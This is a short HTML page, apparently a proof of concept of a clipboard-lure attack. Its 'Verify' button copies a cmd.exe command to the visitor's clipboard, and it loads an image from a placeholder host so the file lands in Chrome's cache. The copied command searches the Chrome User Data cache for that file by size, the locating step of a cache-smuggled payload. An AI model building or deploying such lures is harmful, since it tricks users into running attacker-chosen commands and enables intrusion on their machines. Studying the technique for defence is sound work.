<!doctype html>
<button id="check">Verify</button>
<script>
const image = new Image();
image.src = "https://example.invalid/picture.png";
const command = String.raw`cmd.exe /c for /r "%LocalAppData%\Google\Chrome\User Data" %f in (f_*) do @if %~zf equ 24680 (echo "%f")`;
document.getElementById("check").onclick = () => navigator.clipboard.writeText(command);
</script>
